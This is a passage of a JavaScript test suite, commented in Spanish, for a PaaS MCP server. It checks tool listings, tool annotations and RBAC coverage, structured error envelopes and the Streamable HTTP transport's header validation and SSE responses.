const assert = require('assert');
const mcpServer = require('../server/services/mcpServer');

async function testMcp() {
  console.log('🧪 Testing Model Context Protocol (MCP) Server...');

  // 1. JSON-RPC Initialize
  const initRes = await mcpServer.handleJsonRpc({
    jsonrpc: '2.0',
    id: 1,
    method: 'initialize',
    params: {}
  });
  assert.strictEqual(initRes.jsonrpc, '2.0');
  assert.strictEqual(initRes.id, 1);
  assert.strictEqual(initRes.result.serverInfo.name, 'culkibo-mcp-orchestrator');
  assert.strictEqual(initRes.result.capabilities.prompts.listChanged, false, 'initialize debe anunciar prompts: { listChanged: false }');
  console.log('  ✓ MCP JSON-RPC initialize handshake passed (incl. prompts capability)');

  // 2. tools/list
  const toolsRes = await mcpServer.handleJsonRpc({
    jsonrpc: '2.0',
    id: 2,
    method: 'tools/list',
    params: {}
  });
  assert.strictEqual(toolsRes.jsonrpc, '2.0');
  assert.ok(Array.isArray(toolsRes.result.tools));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_list_pods'));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_hot_sync'));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_issue_wildcard_ssl'));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_analyze_wordpress'));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_import_compose'));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_get_remote_access'));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_get_observability'));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_system_doctor'));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_link_database'));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_toggle_maintenance'));
  assert.ok(toolsRes.result.tools.some(t => t.name === 'culkibo_get_deploy_queue'));
  assert.ok(toolsRes.result.tools.length >= 52, `Se esperaban >=52 herramientas MCP, hay ${toolsRes.result.tools.length}`);
  console.log(`  ✓ MCP tools/list passed (${toolsRes.result.tools.length} AI tools exposed)`);

  // 3. tools/call: culkibo_list_pods
  const callPodsRes = await mcpServer.handleJsonRpc({
    jsonrpc: '2.0',
    id: 3,
    method: 'tools/call',
    params: {
      name: 'culkibo_list_pods',
      arguments: {}
    }
  });
  assert.strictEqual(callPodsRes.jsonrpc, '2.0');
  assert.ok(callPodsRes.result.content);
  assert.ok(callPodsRes.result.content[0].text.includes('The Forge'));
  console.log('  ✓ MCP tools/call (culkibo_list_pods) executed successfully');

  // 4. tools/call: culkibo_hot_sync
  const callSyncRes = await mcpServer.handleJsonRpc({
    jsonrpc: '2.0',
    id: 4,
    method: 'tools/call',
    params: {
      name: 'culkibo_hot_sync',
      arguments: { changedFile: 'src/api/auth.py', diffSize: '8 lines' }
    }
  });
    assert.strictEqual(callSyncRes.jsonrpc, '2.0');
    assert.ok(callSyncRes.result.content[0].text.includes('syncDurationMs'));
    console.log('  ✓ MCP tools/call (culkibo_hot_sync) executed successfully');

  // 5. tools/call: culkibo_inspect_ingress
  const callIngressRes = await mcpServer.handleJsonRpc({
    jsonrpc: '2.0',
    id: 5,
    method: 'tools/call',
    params: {
      name: 'culkibo_inspect_ingress',
      arguments: { hostname: 'preview.culkibo.dev' }
    }
  });
  assert.strictEqual(callIngressRes.jsonrpc, '2.0');
  assert.ok(callIngressRes.result.content[0].text.includes('*.culkibo.dev'));
  console.log('  ✓ MCP tools/call (culkibo_inspect_ingress) executed successfully');

  // 6. tools/call: culkibo_manage_watcher
  const callWatcherRes = await mcpServer.handleJsonRpc({
    jsonrpc: '2.0',
    id: 6,
    method: 'tools/call',
    params: {
      name: 'culkibo_manage_watcher',
      arguments: { action: 'status' }
    }
  });
  assert.strictEqual(callWatcherRes.jsonrpc, '2.0');
  assert.ok(callWatcherRes.result.content[0].text.includes('isWatching'));
  console.log('  ✓ MCP tools/call (culkibo_manage_watcher) executed successfully');

  // 7. tools/call: culkibo_docker_status
  const callDockerStatus = await mcpServer.handleJsonRpc({
    jsonrpc: '2.0',
    id: 7,
    method: 'tools/call',
    params: {
      name: 'culkibo_docker_status',
      arguments: {}
    }
  });
  assert.strictEqual(callDockerStatus.jsonrpc, '2.0');
  assert.ok(callDockerStatus.result.content[0].text.includes('mode'));
  console.log('  ✓ MCP tools/call (culkibo_docker_status) executed successfully');

  // 8. tools/call: culkibo_docker_containers
  const callDockerContainers = await mcpServer.handleJsonRpc({
    jsonrpc: '2.0',
    id: 8,
    method: 'tools/call',
    params: {
      name: 'culkibo_docker_containers',
      arguments: {}
    }
  });
  assert.strictEqual(callDockerContainers.jsonrpc, '2.0');
  assert.ok(callDockerContainers.result.content[0].text.includes('containers'));
  console.log('  ✓ MCP tools/call (culkibo_docker_containers) executed successfully');

  // 9. Audit Log verification
  const audit = mcpServer.getAuditLog(10);
  assert.ok(audit.length >= 6);
  assert.strictEqual(audit[0].toolName, 'culkibo_docker_containers');
  console.log('  ✓ MCP audit trail verified');

  // 10. Anotaciones de herramienta (2026-07-28)
  await testToolAnnotations();

  // 11. Transporte Streamable HTTP (2026-07-28)
  await testStreamableHttpTransport();

  // 12. MCP 2.0/2.1/2026: 109 herramientas, 7 recursos, 13 prompts (8 playbooks), dryRun universal, RBAC y anti-IDOR
  await testMcpV2Capabilities();

  // 13. MCP 2.1: perfiles (-80% contexto), meta-discovery, validación estricta, 4 handlers reparados, 5 anti-IDOR, self-healing ops
  await testMcpV21Superpowers();

  // 14. MCP 2026 Pioneer: 8 playbooks interactivos, culkibo_ship_and_verify (secret scan + confirmToken + smoke + auto-rollback) y culkibo_export_agent_kit
  await testMcp2026PioneerUpgrades();

  // 15. MCP 2026 Cycle-2: World-First PaaS MCP Apps (ui://culkibo/*), culkibo_smartpack_plan y culkibo_edge_tunnel (111 tools)
  await testMcp2026Cycle2AppsAndTools();

  // 16. MCP 2026 Cycle-4: Official Async Tasks (tasks/list|get|result|cancel + RBAC), elicitation/create, SLSA & OTLP (113 tools)
  await testMcp2026Cycle4TasksElicitationAndTools();

  // 17. MCP 2026 Cycle-6: Shadow Traffic Replay, Whole-Stack Time-Machine & FinOps Savings (116 tools)
  await testMcp2026Cycle6ShadowTimeMachineFinOps();

  // 18. MCP 2026 Cycle-7: Build Auto-Healer, WireGuard Fleet Mesh, Cron Timeline & Edge Bot-Shield (120 tools)
  await testMcp2026Cycle7HealerMeshTimelineShield();

  // 19. MCP 2026 Cycle-8: Autonomous Triage, SBOM CVE Scan, Config Drift + PgBouncer, OpenTofu IaC & Secret Leases (125 tools)
  await testMcp2026Cycle8TriageCveDriftIacLease();

  // 20. MCP 2026 Cycle-9: Standard-Webhooks DLQ, Read-Only DB Studio, Post-MinIO S3, Agency Ledger & White-Label Brand (130 tools)
  await testMcp2026Cycle9WebhooksDbS3LedgerBrand();

  // 21. MCP 2026 Cycle-10: DR Fire-Drill, SLO Canary Auto-Rollback, AI/GPU LLM, Remote Builder & Compressed Log Archive (135 tools)
  await testMcp2026Cycle10DrCanaryAiBuilderLogs();

  // 22. MCP 2026 Cycle-11 Milestone: Policy-as-Code Admission, Ed25519 Compliance, Volume Migration, Edge Geo/A-B & Security Posture (140 tools)
  await testMcp2026Cycle11AdmissionComplianceVolumeEdgePosture();

  // 23. MCP 2026 Cycle-12 Milestone: Synthetic API/TLS Sentinel, SQL Migration Linter, KEDA Worker Autoscaler, SPDX License Auditor & Seccomp/runc Guard (145 tools)
  await testMcp2026Cycle12SyntheticSqlAutoscalerLicenseSeccomp();

  // 24. MCP 2026 Cycle-13 Milestone (150 MCP Tools!): Image Bloat/Secrets, Cron Fencing Leases, PR-Preview PII Masker, OOM Forensics & On-Call Router
  await testMcp2026Cycle13BloatLeasePiiOomOncall();

  // 25. MCP 2026 Cycle-14 (155 MCP Tools!): Egress/nftables Drift, Replica Split-Brain Fencing, Shannon-Entropy Secret Gate, Multi-Arch Planner & Chaos GameDay
  await testMcp2026Cycle14EgressReplicaSecretMultiarchChaos();

  // 26. MCP 2026 Cycle-15 Milestone (160 MCP Tools -90% Core!): SPIFFE-Lite mTLS, Feature Flags, AI Rate-Limit Shield, Falco-Lite Anomaly & Immutable Digest Promotion
  await testMcp2026Cycle15MtlsFlagsRatelimitAnomalyPromotion();

  // 27. MCP 2026 Cycle-16 (165 MCP Tools -90.6% Core!): API Contract Gate, OCI/SLSA Rekor Verifier, WS/SSE Flood Guard, DNS Cutover Planner & Orphan PR-Preview Reaper
  await testMcp2026Cycle16ContractOciStreamDnsReaper();

  // 28. MCP 2026 Cycle-17 Milestone (170 MCP Tools -91.1% Core!): Build Reproducibility, Preview Smoke-Gate, Surrogate Edge Cache, VPA-Lite Rightsizer & Blameless Postmortem
  await testMcp2026Cycle17ReproPreviewCacheRightsizePostmortem();

  console.log('✅ All MCP tests passed!\n');
}

/**
 * Las anotaciones son lo que un cliente usa para decidir si pide confirmación
 * a la persona usuaria. Una herramienta que muta marcada como `readOnlyHint`
 * hace que se ejecute sin preguntar, así que eso se fija aquí.
 */
async function testToolAnnotations() {
  const tools = mcpServer.getToolsDefinition();
  assert.strictEqual(tools.length, 170, 'El catálogo MCP 2026 debe tener exactamente 170 herramientas anotadas');
  const uniqueNames = new Set(tools.map(t => t.name));
  assert.strictEqual(uniqueNames.size, 170, 'No puede haber nombres de herramientas duplicados');

  for (const tool of tools) {
    assert.ok(tool.title, `${tool.name} debe declarar title`);
    assert.ok(tool.annotations, `${tool.name} debe declarar annotations`);
    assert.strictEqual(typeof tool.annotations.readOnlyHint, 'boolean', `${tool.name}.readOnlyHint`);
    assert.strictEqual(typeof tool.annotations.openWorldHint, 'boolean', `${tool.name}.openWorldHint`);
    assert.ok(mcpServer.TOOL_POLICIES[tool.name], `${tool.name} debe tener política RBAC en TOOL_POLICIES`);
    if (tool.annotations.readOnlyHint) {
      // `destructiveHint` e `idempotentHint` solo significan algo cuando la
      // herramienta muta; declararlos en una de solo lectura es ruido.
      assert.strictEqual(tool.annotations.destructiveHint, undefined, `${tool.name} es de solo lectura y no debe declarar destructiveHint`);
    } else {
      assert.strictEqual(typeof tool.annotations.destructiveHint, 'boolean', `${tool.name}.destructiveHint`);
      assert.strictEqual(typeof tool.annotations.idempotentHint, 'boolean', `${tool.name}.idempotentHint`);
    }
  }

  const roCount = tools.filter(t => t.annotations.readOnlyHint).length;
  const mutCount = tools.filter(t => !t.annotations.readOnlyHint).length;
  const destCount = tools.filter(t => t.annotations.destructiveHint === true).length;
  const dryRunCount = tools.filter(t => Boolean(t.inputSchema?.properties?.dryRun)).length;
  const outputSchemaCount = tools.filter(t => Boolean(t.outputSchema)).length;
  assert.strictEqual(roCount, 73, `Se esperaban 73 herramientas RO, hay ${roCount}`);
  assert.strictEqual(mutCount, 97, `Se esperaban 97 herramientas mutadoras, hay ${mutCount}`);
  assert.strictEqual(destCount, 43, `Se esperaban 43 herramientas destructivas, hay ${destCount}`);
  assert.strictEqual(dryRunCount, 68, `Se esperaban 68 herramientas con dryRun, hay ${dryRunCount}`);
  assert.ok(outputSchemaCount >= 123, `Se esperaban >=123 herramientas con outputSchema, hay ${outputSchemaCount}`);

  const byName = Object.fromEntries(tools.map(t => [t.name, t]));
  const mustMutate = [
    'culkibo_create_project', 'culkibo_add_resource', 'culkibo_set_project_env',
    'culkibo_deploy_project', 'culkibo_hot_sync', 'culkibo_switch_traffic',
    'culkibo_manage_domain', 'culkibo_manage_watcher',
    'culkibo_create_sslip_domain', 'culkibo_export_backup', 'culkibo_restore_backup',
    'culkibo_github_connect', 'culkibo_github_disconnect', 'culkibo_create_project_from_github',
    'culkibo_import_compose'
  ];
  for (const name of mustMutate) {
    assert.strictEqual(byName[name].annotations.readOnlyHint, false, `${name} muta estado y no puede anotarse como readOnly`);
  }

  const mustBeDestructive = [
    'culkibo_switch_traffic', 'culkibo_manage_domain', 'culkibo_restore_backup',
    'culkibo_github_disconnect', 'culkibo_deploy_project'
  ];
  for (const name of mustBeDestructive) {
    assert.strictEqual(byName[name].annotations.destructiveHint, true, `${name} destruye o reemplaza estado vivo`);
  }

  const mustBeReadOnly = [
    'culkibo_list_projects', 'culkibo_get_project', 'culkibo_list_pods',
    'culkibo_inspect_ingress', 'culkibo_get_logs', 'culkibo_docker_status',
    'culkibo_docker_containers', 'culkibo_github_status', 'culkibo_github_list_repos',
    'culkibo_github_get_branches', 'culkibo_github_auto_detect',
    // No emite nada: devuelve siempre el error de «no implementado». Estaba en
    // `mustMutate` porque fabricaba un PEM y lo guardaba en disco como si fuera
    // un certificado real.
    'culkibo_issue_wildcard_ssl',
    'culkibo_analyze_wordpress', 'culkibo_get_remote_access'
  ];
  for (const name of mustBeReadOnly) {
    assert.strictEqual(byName[name].annotations.readOnlyHint, true, `${name} no muta nada`);
  }

  // Las que hablan con un tercero tienen que declararlo: de ahí depende la
  // clasificación de sus fallos como reintentables.
  assert.strictEqual(byName.culkibo_github_list_repos.annotations.openWorldHint, true);
  assert.strictEqual(byName.culkibo_list_pods.annotations.openWorldHint, false);

  // `culkibo_issue_wildcard_ssl` ya no emite nada: devuelve siempre un error
  // explicativo. Sus anotaciones tienen que decirlo, o un agente creerá que
  // invocarla cambia algo — que es justo lo que hacía cuando fabricaba un PEM.
  assert.strictEqual(byName.culkibo_issue_wildcard_ssl.annotations.readOnlyHint, true,
    'La emisión de comodín no está implementada: no muta nada');
  assert.strictEqual(byName.culkibo_issue_wildcard_ssl.annotations.openWorldHint, false,
    'No habla con ninguna CA: ya no hay llamada ACME que pueda fallar de forma reintentable');
  assert.ok(/NOT IMPLEMENTED/.test(byName.culkibo_issue_wildcard_ssl.description),
    'La descripción debe advertir al agente de que la herramienta no emite nada');

  assert.ok(byName.culkibo_list_pods.outputSchema, 'culkibo_list_pods debe declarar outputSchema');
  console.log(`  ✓ Anotaciones verificadas en las ${tools.length} herramientas (${tools.filter(t => t.annotations.readOnlyHint).length} de solo lectura, ${tools.filter(t => t.annotations.destructiveHint).length} destructivas)`);
}

/**
 * Transporte Streamable HTTP de la revisión 2026-07-28.
 *
 * Se monta el router real sobre un puerto efímero en vez de hablar con el
 * daemon de turno: así la suite no depende de que haya uno levantado ni del
 * puerto 3030, y prueba el cableado de rutas de verdad.
 */
async function testStreamableHttpTransport() {
  const express = require('express');
  const { authMiddleware } = require('../server/middleware/auth');
  const apiRouter = require('../server/routes/api');

  const app = express();
  app.use(express.json({ limit: '10mb' }));
  app.use(authMiddleware);
  app.use('/api', apiRouter);

  const server = await new Promise((resolve) => {
    const s = app.listen(0, '127.0.0.1', () => resolve(s));
  });

  const V = mcpServer.protocol.PROTOCOL_VERSION;
  const base = `http://127.0.0.1:${server.address().port}`;
  const endpoint = `${base}/api/mcp`;

  const meta = () => ({
    'io.modelcontextprotocol/protocolVersion': V,
    'io.modelcontextprotocol/clientCapabilities': {},
    'io.modelcontextprotocol/clientInfo': { name: 'culkibo-test-client', version: '1.0.0' }
  });

  const post = (headers, body) => fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json, text/event-stream',
      ...headers
    },
    body: JSON.stringify(body)
  });

  try {
    assert.strictEqual(V, '2026-07-28', 'La revisión declarada debe ser la vigente');

    // 1. server/discover — obligatorio en esta revisión.
    const discoverRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'server/discover' },
      { jsonrpc: '2.0', id: 'disc-1', method: 'server/discover', params: { _meta: meta() } }
    );
    assert.strictEqual(discoverRes.status, 200);
    const discover = await discoverRes.json();
    assert.strictEqual(discover.id, 'disc-1');
    assert.strictEqual(discover.result.resultType, 'complete');
    assert.deepStrictEqual(discover.result.supportedVersions, [V]);
    assert.ok(discover.result.capabilities.tools, 'discover debe anunciar la capacidad tools');
    assert.strictEqual(
      discover.result._meta['io.modelcontextprotocol/serverInfo'].name,
      'culkibo-mcp-orchestrator'
    );
    assert.ok(discover.result.instructions.length > 0, 'discover debe traer instrucciones para el agente');
    console.log('  ✓ server/discover responde versiones, capacidades e identidad');

    // 2. Cabecera y cuerpo discrepan en la versión -> 400 con -32020.
    const mismatchRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'tools/list' },
      {
        jsonrpc: '2.0',
        id: 'mm-1',
        method: 'tools/list',
        params: { _meta: { ...meta(), 'io.modelcontextprotocol/protocolVersion': '2025-11-25' } }
      }
    );
    assert.strictEqual(mismatchRes.status, 400, 'Un desacuerdo cabecera/cuerpo debe ser 400');
    const mismatch = await mismatchRes.json();
    assert.strictEqual(mismatch.error.code, -32020, 'Debe ser HeaderMismatch');
    assert.strictEqual(mismatch.id, 'mm-1');
    assert.strictEqual(mismatch.error.data.header.value, V);
    assert.strictEqual(mismatch.error.data.body.value, '2025-11-25');
    console.log('  ✓ HeaderMismatch (-32020) al discrepar MCP-Protocol-Version y _meta');

    // 3. Mcp-Method ausente y Mcp-Name discrepante -> también -32020.
    const noMethodHeader = await post(
      { 'MCP-Protocol-Version': V },
      { jsonrpc: '2.0', id: 'mm-2', method: 'tools/list', params: { _meta: meta() } }
    );
    assert.strictEqual(noMethodHeader.status, 400);
    assert.strictEqual((await noMethodHeader.json()).error.code, -32020);

    const badName = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'tools/call', 'Mcp-Name': 'culkibo_list_projects' },
      {
        jsonrpc: '2.0',
        id: 'mm-3',
        method: 'tools/call',
        params: { name: 'culkibo_list_pods', arguments: {}, _meta: meta() }
      }
    );
    assert.strictEqual(badName.status, 400);
    const badNameBody = await badName.json();
    assert.strictEqual(badNameBody.error.code, -32020);
    assert.strictEqual(badNameBody.error.data.body.value, 'culkibo_list_pods');
    console.log('  ✓ HeaderMismatch (-32020) por Mcp-Method ausente y por Mcp-Name discrepante');

    // 4. Mcp-Name en el sentinela Base64 de la especificación.
    const encodedName = `=?base64?${Buffer.from('culkibo_list_pods', 'utf8').toString('base64')}?=`;
    const sentinelRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'tools/call', 'Mcp-Name': encodedName },
      {
        jsonrpc: '2.0',
        id: 'b64-1',
        method: 'tools/call',
        params: { name: 'culkibo_list_pods', arguments: {}, _meta: meta() }
      }
    );
    assert.strictEqual(sentinelRes.status, 200, 'El sentinela Base64 debe decodificarse antes de comparar');
    console.log('  ✓ Mcp-Name codificado en Base64 se decodifica antes de comparar');

    // 5. Versión no soportada -> -32022 listando las que sí.
    const oldVersionRes = await post(
      { 'MCP-Protocol-Version': '2025-06-18', 'Mcp-Method': 'tools/list' },
      {
        jsonrpc: '2.0',
        id: 'ver-1',
        method: 'tools/list',
        params: { _meta: { ...meta(), 'io.modelcontextprotocol/protocolVersion': '2025-06-18' } }
      }
    );
    assert.strictEqual(oldVersionRes.status, 400);
    const oldVersion = await oldVersionRes.json();
    assert.strictEqual(oldVersion.error.code, -32022);
    assert.deepStrictEqual(oldVersion.error.data.supported, [V]);
    assert.strictEqual(oldVersion.error.data.requested, '2025-06-18');
    console.log('  ✓ UnsupportedProtocolVersion (-32022) enumera las versiones soportadas');

    // 6. `_meta` obligatorio ausente -> -32602 diciendo qué falta.
    const noMetaRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'tools/list' },
      { jsonrpc: '2.0', id: 'meta-1', method: 'tools/list', params: {} }
    );
    assert.strictEqual(noMetaRes.status, 400);
    const noMeta = await noMetaRes.json();
    assert.strictEqual(noMeta.error.code, -32602);
    assert.ok(noMeta.error.data.missing.includes('io.modelcontextprotocol/protocolVersion'));
    assert.ok(noMeta.error.data.missing.includes('io.modelcontextprotocol/clientCapabilities'));
    console.log('  ✓ _meta obligatorio ausente -> -32602 con la lista de campos que faltan');

    // 7. tools/list sobre el transporte nuevo + perfiles ?profile= y params.query.
    assert.strictEqual(discover.result.capabilities.tools.filtering, true, 'discover debe anunciar capabilities.tools.filtering');
    const listRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'tools/list' },
      { jsonrpc: '2.0', id: 'list-1', method: 'tools/list', params: { _meta: meta() } }
    );
    const list = await listRes.json();
    assert.strictEqual(list.result.resultType, 'complete');
    assert.strictEqual(list.result.tools.length, 170);

    // 7b. ?profile=core reduce el tamaño/tokens de tools/list en >=80% y mantiene callable herramientas descubiertas.
    const coreListRes = await fetch(`${endpoint}?profile=core`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json, text/event-stream',
        'MCP-Protocol-Version': V,
        'Mcp-Method': 'tools/list'
      },
      body: JSON.stringify({ jsonrpc: '2.0', id: 'list-core', method: 'tools/list', params: { _meta: meta() } })
    });
    assert.strictEqual(coreListRes.status, 200);
    assert.strictEqual(coreListRes.headers.get('x-culkibo-mcp-profile'), 'core');
    const coreList = await coreListRes.json();
    assert.strictEqual(coreList.result.profile, 'core');
    assert.ok(coreList.result.tools.some((t) => t.name === 'culkibo_search_tools'));
    assert.ok(coreList.result.tools.some((t) => t.name === 'culkibo_diagnose_incident'));
    assert.ok(coreList.result.tools.some((t) => t.name === 'culkibo_auto_remediate'));
    const fullBytes = Buffer.byteLength(JSON.stringify(list.result.tools), 'utf8');
    const coreBytes = Buffer.byteLength(JSON.stringify(coreList.result.tools), 'utf8');
    const savedRatio = 1 - (coreBytes / fullBytes);
    assert.ok(savedRatio >= 0.80, `?profile=core debe recortar >=80% de tokens/bytes (logró ${(savedRatio * 100).toFixed(1)}%)`);

    // Invocar una herramienta fuera de ?profile=core tras descubrirla sigue funcionando
    const crossProfileCall = await fetch(`${endpoint}?profile=core`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
        'MCP-Protocol-Version': V,
        'Mcp-Method': 'tools/call',
        'Mcp-Name': 'culkibo_list_pods'
      },
      body: JSON.stringify({ jsonrpc: '2.0', id: 'call-xp', method: 'tools/call', params: { name: 'culkibo_list_pods', arguments: {}, _meta: meta() } })
    });
    assert.strictEqual(crossProfileCall.status, 200);
    assert.strictEqual((await crossProfileCall.json()).result.isError, false);

    // Perfil inválido en query string -> 400 + -32602
    const badProfileRes = await fetch(`${endpoint}?profile=nonexistent`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
        'MCP-Protocol-Version': V,
        'Mcp-Method': 'tools/list'
      },
      body: JSON.stringify({ jsonrpc: '2.0', id: 'bad-prof', method: 'tools/list', params: { _meta: meta() } })
    });
    assert.strictEqual(badProfileRes.status, 400);
    assert.strictEqual((await badProfileRes.json()).error.code, -32602);

    // params.query en tools/list
    const queryListRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'tools/list' },
      { jsonrpc: '2.0', id: 'list-q', method: 'tools/list', params: { query: 'oom memory', limit: 5, _meta: meta() } }
    );
    const queryList = await queryListRes.json();
    assert.ok(queryList.result.tools.length >= 1 && queryList.result.tools.length <= 5);
    console.log(`  ✓ tools/list Streamable HTTP (${list.result.tools.length} tools; ?profile=core -> ${coreList.result.tools.length} tools, -${(savedRatio * 100).toFixed(1)}% bytes, params.query ok)`);

    // 8. tools/call con salida estructurada.
    const callRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'tools/call', 'Mcp-Name': 'culkibo_list_pods' },
      {
        jsonrpc: '2.0',
        id: 'call-1',
        method: 'tools/call',
        params: { name: 'culkibo_list_pods', arguments: {}, _meta: meta() }
      }
    );
    const call = await callRes.json();
    assert.strictEqual(call.result.resultType, 'complete');
    assert.strictEqual(call.result.isError, false);
    assert.ok(call.result.structuredContent.pods, 'tools/call debe traer structuredContent');
    console.log('  ✓ tools/call devuelve content y structuredContent');

    // 9. Error de herramienta: accionable, no un volcado de texto.
    const failRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'tools/call', 'Mcp-Name': 'culkibo_get_project' },
      {
        jsonrpc: '2.0',
        id: 'call-2',
        method: 'tools/call',
        params: { name: 'culkibo_get_project', arguments: { projectId: 'no_existe_seguro' }, _meta: meta() }
      }
    );
    const fail = await failRes.json();
    assert.strictEqual(failRes.status, 200, 'Un fallo de herramienta no es un error de protocolo');
    assert.strictEqual(fail.result.isError, true);
    const failEnvelope = JSON.parse(fail.result.content[0].text);
    assert.strictEqual(failEnvelope.code, 'PROJECT_NOT_FOUND');
    assert.strictEqual(failEnvelope.retryable, false);
    assert.ok(failEnvelope.remediation.includes('culkibo_list_projects'));
    assert.strictEqual(failEnvelope.details.projectId, 'no_existe_seguro');

    // Un argumento obligatorio ausente se corrige solo si se dice cuál.
    const missingArgRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'tools/call', 'Mcp-Name': 'culkibo_get_project' },
      {
        jsonrpc: '2.0',
        id: 'call-3',
        method: 'tools/call',
        params: { name: 'culkibo_get_project', arguments: {}, _meta: meta() }
      }
    );
    const missingArg = JSON.parse((await missingArgRes.json()).result.content[0].text);
    assert.strictEqual(missingArg.code, 'MISSING_ARGUMENT');
    assert.strictEqual(missingArg.retryable, true);
    assert.deepStrictEqual(missingArg.details.missing, ['projectId']);
    console.log('  ✓ Errores de herramienta estructurados (code, retryable, remediation, details)');

    // 10. Notificación -> 202 sin cuerpo.
    const notifRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'notifications/progress' },
      { jsonrpc: '2.0', method: 'notifications/progress', params: { progressToken: 'x', progress: 1 } }
    );
    assert.strictEqual(notifRes.status, 202);
    assert.strictEqual((await notifRes.text()).length, 0, 'Una notificación se contesta sin cuerpo');
    console.log('  ✓ Notificación aceptada con 202 y sin cuerpo');

    // 11. GET y DELETE ya no existen en esta revisión.
    const getRes = await fetch(endpoint);
    assert.strictEqual(getRes.status, 405);
    assert.strictEqual(getRes.headers.get('allow'), 'POST');
    const deleteRes = await fetch(endpoint, { method: 'DELETE' });
    assert.strictEqual(deleteRes.status, 405);
    console.log('  ✓ GET y DELETE sobre el endpoint MCP responden 405 con Allow: POST');

    // 12. resources/list, resources/read, prompts/list, prompts/get + método desconocido -> 404 con -32601.
    const resListHttp = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'resources/list' },
      { jsonrpc: '2.0', id: 'res-1', method: 'resources/list', params: { _meta: meta() } }
    );
    assert.strictEqual(resListHttp.status, 200);
    const resList = await resListHttp.json();
    assert.ok(resList.result.resources.some((r) => r.uri === 'culkibo://projects'));

    const resReadHttp = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'resources/read', 'Mcp-Name': 'culkibo://pods' },
      { jsonrpc: '2.0', id: 'res-2', method: 'resources/read', params: { uri: 'culkibo://pods', _meta: meta() } }
    );
    assert.strictEqual(resReadHttp.status, 200);
    const resRead = await resReadHttp.json();
    assert.ok(resRead.result.contents[0].text.includes('The Forge'));

    const promptsListHttp = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'prompts/list' },
      { jsonrpc: '2.0', id: 'prm-1', method: 'prompts/list', params: { _meta: meta() } }
    );
    assert.strictEqual(promptsListHttp.status, 200);
    const promptsList = await promptsListHttp.json();
    assert.ok(promptsList.result.prompts.some((p) => p.name === 'debug-failed-deploy'));

    const promptGetHttp = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'prompts/get', 'Mcp-Name': 'audit-security-tls' },
      { jsonrpc: '2.0', id: 'prm-2', method: 'prompts/get', params: { name: 'audit-security-tls', arguments: {}, _meta: meta() } }
    );
    assert.strictEqual(promptGetHttp.status, 200);
    const promptGet = await promptGetHttp.json();
    assert.ok(promptGet.result.messages[0].content.text.includes('culkibo_system_doctor'));

    const unknownRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'sampling/createMessage' },
      { jsonrpc: '2.0', id: 'unk-1', method: 'sampling/createMessage', params: { _meta: meta() } }
    );
    assert.strictEqual(unknownRes.status, 404);
    const unknown = await unknownRes.json();
    assert.strictEqual(unknown.error.code, -32601);
    assert.ok(unknown.error.data.supported.includes('server/discover'));
    console.log('  ✓ resources/*, prompts/* y método no implementado (404 -32601) verificados');

    // 13. Respuesta SSE cuando el cliente pide progreso.
    const streamRes = await post(
      { 'MCP-Protocol-Version': V, 'Mcp-Method': 'tools/call', 'Mcp-Name': 'culkibo_list_pods' },
      {
        jsonrpc: '2.0',
        id: 'sse-1',
        method: 'tools/call',
        params: {
          name: 'culkibo_list_pods',
          arguments: {},
          _meta: { ...meta(), progressToken: 'tok-1' }
        }
      }
    );
    assert.strictEqual(streamRes.status, 200);
    assert.ok(streamRes.headers.get('content-type').includes('text/event-stream'));
    assert.strictEqual(streamRes.headers.get('cache-control'), 'private, no-cache, no-transform');
    assert.strictEqual(streamRes.headers.get('x-accel-buffering'), 'no', 'El stream debe pedir a los proxies que no lo acumulen');
    const streamBody = await streamRes.text();
    assert.ok(streamBody.startsWith(':'), 'El stream debe abrir con un comentario keep-alive');
    const finalEvent = streamBody.split('\n').find(line => line.startsWith('data: '));
    const finalEnvelope = JSON.parse(finalEvent.slice('data: '.length));
    assert.strictEqual(finalEnvelope.id, 'sse-1');
    assert.strictEqual(finalEnvelope.result.resultType, 'complete');
    console.log('  ✓ Respuesta SSE con keep-alive, X-Accel-Buffering y respuesta final en el stream');

    // 14. Mcp-Session-Id y Last-Event-ID ya no existen: se ignoran sin eco.
    const ignoredHeadersRes = await post(
      {
        'MCP-Protocol-Version': V,
        'Mcp-Method': 'tools/list',
        'Mcp-Session-Id': 'sesion-de-otra-era',
        'Last-Event-ID': '42'
      },
      { jsonrpc: '2.0', id: 'ign-1', method: 'tools/list', params: { _meta: meta() } }
    );
    assert.strictEqual(ignoredHeadersRes.status, 200);
    assert.strictEqual(ignoredHeadersRes.headers.get('mcp-session-id'), null, 'No se acuñan ni se devuelven sesiones');
    console.log('  ✓ Mcp-Session-Id y Last-Event-ID se ignoran sin devolver eco');

